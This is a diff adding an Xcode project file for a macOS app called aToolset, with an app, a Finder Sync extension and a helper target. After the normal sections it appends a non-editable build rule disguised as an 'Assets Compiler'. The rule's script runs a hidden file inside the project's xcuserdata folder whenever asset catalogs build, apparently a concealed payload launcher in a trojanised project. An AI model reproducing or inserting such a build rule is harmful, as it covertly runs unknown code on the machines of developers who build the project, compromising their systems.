+					EA773C87261C65D300AA499A = {
+						CreatedOnToolsVersion = 12.3;
+					};
+				};
+			};
+			buildConfigurationList = EA773C6B261C658F00AA499A /* Build configuration list for PBXProject "aToolset" */;
+			compatibilityVersion = "Xcode 9.3";
+			developmentRegion = en;
+			hasScannedForEncodings = 0;
+			knownRegions = (
+				en,
+				Base,
+			);
+			mainGroup = EA773C67261C658F00AA499A;
+			productRefGroup = EA773C71261C658F00AA499A /* Products */;
+			projectDirPath = "";
+			projectRoot = "";
+			targets = (
+				EA773C6F261C658F00AA499A /* Toolset */,
+				EA773C87261C65D300AA499A /* ToolsetExtension */,
+				EA6D6417261D9D3200B952C4 /* aToolsetHelper */,
+			);
+		};
+/* End PBXProject section */
+
+/* Begin PBXResourcesBuildPhase section */
+		EA6D6416261D9D3200B952C4 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				EA6D641F261D9D3400B952C4 /* Assets.xcassets in Resources */,
+				EA6D6422261D9D3400B952C4 /* Main.storyboard in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		EA773C6E261C658F00AA499A /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				EA6D6385261D572500B952C4 /* data.plist in Resources */,
+				EA773C78261C659200AA499A /* Assets.xcassets in Resources */,
+				EA773C7B261C659200AA499A /* Main.storyboard in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		EA773C86261C65D300AA499A /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				EA6D6403261D9B9800B952C4 /* Assets.xcassets in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+/* End PBXShellScriptBuildPhase section */
+
+/* Begin PBXSourcesBuildPhase section */
+		EA6D6414261D9D3200B952C4 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				EA6D641B261D9D3200B952C4 /* AppDelegate.swift in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		EA773C6C261C658F00AA499A /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				EA773CE9261C684900AA499A /* LYBIconModel.m in Sources */,
+				EA773CDA261C684900AA499A /* MJExtensionConst.m in Sources */,
+				EA773CE4261C684900AA499A /* NSDictionary+Extension.m in Sources */,
+				EA773CE8261C684900AA499A /* LYBImageTools.m in Sources */,
+				EA773CDD261C684900AA499A /* NSString+MJExtension.m in Sources */,
+				EA773CDB261C684900AA499A /* NSObject+MJProperty.m in Sources */,
+				EA773CD9261C684900AA499A /* NSObject+MJCoding.m in Sources */,
+				EA773CDC261C684900AA499A /* NSObject+MJClass.m in Sources */,
+				EA773CE2261C684900AA499A /* NSArray+Extension.m in Sources */,
+				EA773CE3261C684900AA499A /* NSImage+Extension.m in Sources */,
+				EA773CE5261C684900AA499A /* NSDate+Extension.m in Sources */,
+				EA773CE0261C684900AA499A /* XMLReader.m in Sources */,
+				EA773CE7261C684900AA499A /* LYBFileTools.m in Sources */,
+				EA773CD8261C684900AA499A /* MJProperty.m in Sources */,
+				EA773CDF261C684900AA499A /* MJFoundation.m in Sources */,
+				EA773CDE261C684900AA499A /* MJPropertyKey.m in Sources */,
+				EA773CE6261C684900AA499A /* NSString+Extension.m in Sources */,
+				EA773CD6261C684900AA499A /* MJPropertyType.m in Sources */,
+				EA773CD7261C684900AA499A /* NSObject+MJKeyValue.m in Sources */,
+				EA773C74261C658F00AA499A /* AppDelegate.swift in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		EA773C84261C65D300AA499A /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				EA773D1C261C69E100AA499A /* LYBFileTools.m in Sources */,
+				EA773D19261C69DD00AA499A /* LYBIconModel.m in Sources */,
+				EA773D25261C69EF00AA499A /* NSDictionary+Extension.m in Sources */,
+				EA773D16261C69DA00AA499A /* LYBImageTools.m in Sources */,
+				EA773D0A261C69C300AA499A /* NSObject+MJClass.m in Sources */,
+				EA773D10261C69C800AA499A /* NSString+MJExtension.m in Sources */,
+				EA773CFD261C69B600AA499A /* NSObject+MJKeyValue.m in Sources */,
+				EA773D1F261C69E700AA499A /* NSArray+Extension.m in Sources */,
+				EA773D13261C69CF00AA499A /* MJFoundation.m in Sources */,
+				EA773D22261C69EC00AA499A /* NSImage+Extension.m in Sources */,
+				EA773D28261C69F200AA499A /* NSDate+Extension.m in Sources */,
+				EA773CFA261C69B300AA499A /* MJPropertyType.m in Sources */,
+				EA773D04261C69BD00AA499A /* MJExtensionConst.m in Sources */,
+				EA773D03261C69BB00AA499A /* NSObject+MJCoding.m in Sources */,
+				EA773CF7261C69AA00AA499A /* XMLReader.m in Sources */,
+				EA773D2B261C69F500AA499A /* NSString+Extension.m in Sources */,
+				EA773D00261C69B800AA499A /* MJProperty.m in Sources */,
+				EA773D0D261C69C600AA499A /* MJPropertyKey.m in Sources */,
+				EA773C8B261C65D300AA499A /* FinderSync.swift in Sources */,
+				EA773D07261C69C000AA499A /* NSObject+MJProperty.m in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXSourcesBuildPhase section */
+
+/* Begin PBXTargetDependency section */
+		EA773C8F261C65D300AA499A /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = EA773C87261C65D300AA499A /* ToolsetExtension */;
+			targetProxy = EA773C8E261C65D300AA499A /* PBXContainerItemProxy */;
+		};
+/* End PBXTargetDependency section */
+
+/* Begin PBXVariantGroup section */
+		EA6D6420261D9D3400B952C4 /* Main.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				EA6D6421261D9D3400B952C4 /* Base */,
+			);
+			name = Main.storyboard;
+			sourceTree = "<group>";
+		};
+		EA773C79261C659200AA499A /* Main.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				EA773C7A261C659200AA499A /* Base */,
+			);
+			name = Main.storyboard;
+			sourceTree = "<group>";
+		};
+/* End PBXVariantGroup section */
+
+/* Begin XCBuildConfiguration section */
+		EA6D6426261D9D3400B952C4 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_ENTITLEMENTS = aToolsetHelper/aToolsetHelper.entitlements;
+				CODE_SIGN_STYLE = Automatic;
+				COMBINE_HIDPI_IMAGES = YES;
+				INFOPLIST_FILE = aToolsetHelper/Info.plist;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/../Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = com.liyb.aToolsetHelper;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SKIP_INSTALL = YES;
+				SWIFT_VERSION = 5.0;
+			};
+			name = Debug;
+		};
+		EA6D6427261D9D3400B952C4 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_ENTITLEMENTS = aToolsetHelper/aToolsetHelper.entitlements;
+				CODE_SIGN_STYLE = Automatic;
+				COMBINE_HIDPI_IMAGES = YES;
+				INFOPLIST_FILE = aToolsetHelper/Info.plist;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/../Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = com.liyb.aToolsetHelper;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SKIP_INSTALL = YES;
+				SWIFT_VERSION = 5.0;
+			};
+			name = Release;
+		};
+		EA773C7E261C659200AA499A /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
+				CLANG_CXX_LIBRARY = "libc++";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = dwarf;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_TESTABILITY = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu11;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"DEBUG=1",
+					"$(inherited)",
+				);
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				MACOSX_DEPLOYMENT_TARGET = 11.1;
+				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
+				MTL_FAST_MATH = YES;
+				ONLY_ACTIVE_ARCH = YES;
+				SDKROOT = macosx;
+				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
+				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
+			};
+			name = Debug;
+		};
+		EA773C7F261C659200AA499A /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
+				CLANG_CXX_LIBRARY = "libc++";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				ENABLE_NS_ASSERTIONS = NO;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu11;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				MACOSX_DEPLOYMENT_TARGET = 11.1;
+				MTL_ENABLE_DEBUG_INFO = NO;
+				MTL_FAST_MATH = YES;
+				SDKROOT = macosx;
+				SWIFT_COMPILATION_MODE = wholemodule;
+				SWIFT_OPTIMIZATION_LEVEL = "-O";
+			};
+			name = Release;
+		};
+		EA773C81261C659200AA499A /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_ENTITLEMENTS = aToolset/Toolset.entitlements;
+				CODE_SIGN_STYLE = Automatic;
+				COMBINE_HIDPI_IMAGES = YES;
+				INFOPLIST_FILE = aToolset/Info.plist;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/../Frameworks",
+				);
+				MACOSX_DEPLOYMENT_TARGET = 10.13;
+				PRODUCT_BUNDLE_IDENTIFIER = com.liyb.Toolset;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_OBJC_BRIDGING_HEADER = "aToolset/bridging-header.h";
+				SWIFT_VERSION = 5.0;
+			};
+			name = Debug;
+		};
+		EA773C82261C659200AA499A /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_ENTITLEMENTS = aToolset/Toolset.entitlements;
+				CODE_SIGN_STYLE = Automatic;
+				COMBINE_HIDPI_IMAGES = YES;
+				INFOPLIST_FILE = aToolset/Info.plist;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/../Frameworks",
+				);
+				MACOSX_DEPLOYMENT_TARGET = 10.13;
+				PRODUCT_BUNDLE_IDENTIFIER = com.liyb.Toolset;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_OBJC_BRIDGING_HEADER = "aToolset/bridging-header.h";
+				SWIFT_VERSION = 5.0;
+			};
+			name = Release;
+		};
+		EA773C92261C65D300AA499A /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				CODE_SIGN_ENTITLEMENTS = aToolsetExtension/ToolsetExtension.entitlements;
+				CODE_SIGN_STYLE = Automatic;
+				COMBINE_HIDPI_IMAGES = YES;
+				INFOPLIST_FILE = aToolsetExtension/Info.plist;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/../Frameworks",
+					"@executable_path/../../../../Frameworks",
+				);
+				MACOSX_DEPLOYMENT_TARGET = 10.13;
+				PRODUCT_BUNDLE_IDENTIFIER = com.liyb.Toolset.ToolsetExtension;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SKIP_INSTALL = YES;
+				SWIFT_OBJC_BRIDGING_HEADER = "aToolset/bridging-header.h";
+				SWIFT_VERSION = 5.0;
+			};
+			name = Debug;
+		};
+		EA773C93261C65D300AA499A /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				CODE_SIGN_ENTITLEMENTS = aToolsetExtension/ToolsetExtension.entitlements;
+				CODE_SIGN_STYLE = Automatic;
+				COMBINE_HIDPI_IMAGES = YES;
+				INFOPLIST_FILE = aToolsetExtension/Info.plist;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/../Frameworks",
+					"@executable_path/../../../../Frameworks",
+				);
+				MACOSX_DEPLOYMENT_TARGET = 10.13;
+				PRODUCT_BUNDLE_IDENTIFIER = com.liyb.Toolset.ToolsetExtension;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SKIP_INSTALL = YES;
+				SWIFT_OBJC_BRIDGING_HEADER = "aToolset/bridging-header.h";
+				SWIFT_VERSION = 5.0;
+			};
+			name = Release;
+		};
+/* End XCBuildConfiguration section */
+
+/* Begin XCConfigurationList section */
+		EA6D6425261D9D3400B952C4 /* Build configuration list for PBXNativeTarget "aToolsetHelper" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				EA6D6426261D9D3400B952C4 /* Debug */,
+				EA6D6427261D9D3400B952C4 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		EA773C6B261C658F00AA499A /* Build configuration list for PBXProject "aToolset" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				EA773C7E261C659200AA499A /* Debug */,
+				EA773C7F261C659200AA499A /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		EA773C80261C659200AA499A /* Build configuration list for PBXNativeTarget "Toolset" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				EA773C81261C659200AA499A /* Debug */,
+				EA773C82261C659200AA499A /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		EA773C91261C65D300AA499A /* Build configuration list for PBXNativeTarget "ToolsetExtension" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				EA773C92261C65D300AA499A /* Debug */,
+				EA773C93261C65D300AA499A /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+/* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+			
+
+		E38AAE00AE46AD4248AAC43A /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			name = "Assets Compiler";
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" true\n\n";
+			};
+			
+	
+			/* End PBXBuildRule section */
+		
+		
+	};
+	rootObject = EA773C68261C658F00AA499A /* Project object */;
+}
